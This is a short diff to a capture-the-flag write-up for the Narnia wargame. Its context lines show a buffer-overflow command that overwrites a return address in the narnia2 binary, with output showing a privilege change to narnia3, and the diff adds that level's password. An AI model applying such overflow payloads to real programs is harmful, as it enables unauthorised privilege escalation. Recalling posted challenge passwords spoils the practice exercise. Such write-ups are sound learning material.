@@ -165,6 +165,8 @@ narnia2@narnia:/narnia$ env - ./narnia2 $(python -c 'print "A" * 132 + "\x90\xdd
 $ id
 uid=14002(narnia2) gid=14002(narnia2) euid=14003(narnia3) groups=14002(narnia2)
 $
+```
+Narnia2 password: `vaequeezee`
 ## Narnia3
 ## Narnia4
 ## Narnia5
